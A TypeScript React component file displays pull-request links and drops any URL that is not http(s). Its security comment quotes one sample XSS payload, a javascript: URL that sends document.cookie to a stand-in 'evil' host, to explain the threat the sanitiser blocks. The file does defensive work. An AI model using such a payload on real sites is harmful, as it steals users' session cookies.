import { Button } from '@/components/ui/button';
import { cn } from '@/lib/utils';
import { useTranslations } from 'next-intl';

/**
 * Security: PR URLs (`mainPR.url` / `dataPR.url`) come from the git-provider
 * API response stored in `work.lastPullRequest.main.url` / `.data.url`. A
 * malicious or misconfigured git plugin (untrusted external content) could
 * return `javascript:fetch('//evil/?c='+document.cookie)`, which would execute
 * when the rendered `<Link href>` is clicked — `rel="noopener noreferrer"`
 * does not block it. Returns `undefined` for anything that isn't http(s)
 * (including non-string values, which throw in `new URL` and hit the catch).
 * Mirrors `safeExternalUrl` in FeedRow.tsx / ItemCard.tsx / ComparisonDetailClient.tsx.
 */
function safeExternalUrl(raw: string | undefined | null): string | undefined {
    if (!raw) return undefined;
    try {
        const parsed = new URL(raw);
        if (parsed.protocol !== 'https:' && parsed.protocol !== 'http:') {
            return undefined;
        }
        return parsed.toString();
    } catch {
        return undefined;
    }
}

export function PrUpdateInfo({
    mainPR,
    dataPR,
    className,
}: {
    mainPR: any;
    dataPR: any;
    className?: string;
}) {
    const tConf = useTranslations('dashboard.workDetail.config');

    if (!mainPR?.url && !dataPR?.url) {
        return null;
    }

    // Security: only http(s) PR URLs are used as link hrefs; unsafe schemes are dropped.
    const mainPrUrl = safeExternalUrl(mainPR?.url);
    const dataPrUrl = safeExternalUrl(dataPR?.url);

    return (
        <div className={className}>
            <h4 className="text-sm font-medium text-text-secondary dark:text-text-secondary-dark mb-2">
                {tConf('pullRequestUpdate')}
            </h4>
            <div className="bg-surface dark:bg-surface-dark rounded-md p-3 space-y-2">
                <div className={cn(!mainPR?.branch && 'hidden')}>
                    <p className="text-xs text-text-muted dark:text-text-muted-dark">
                        {tConf('mainRepository')}
                    </p>
                    <Button
                        href={mainPrUrl || '#'}
                        target="_blank"
                        variant="unstyled"
                        rel="noopener noreferrer"
                        className={cn(
                            'text-sm',
                            mainPrUrl && 'text-primary hover:underline font-mono',
                        )}
                    >
                        {mainPR?.branch?.substring(0, 10)} -{' '}
                        {mainPR?.number ? `#${mainPR.number}` : '-'}
                    </Button>
                </div>

                <div className={cn(!dataPR?.branch && 'hidden')}>
                    <p className="text-xs text-text-muted dark:text-text-muted-dark">
                        {tConf('dataRepository')}
                    </p>
                    <Button
                        href={dataPrUrl}
                        target="_blank"
                        variant="unstyled"
                        rel="noopener noreferrer"
                        className={cn(
                            'text-sm',
                            dataPrUrl && 'text-primary hover:underline font-mono',
                        )}
                    >
                        {dataPR?.branch?.substring(0, 10)} -{' '}
                        {dataPR?.number ? `#${dataPR.number}` : '-'}
                    </Button>
                </div>
            </div>
        </div>
    );
}
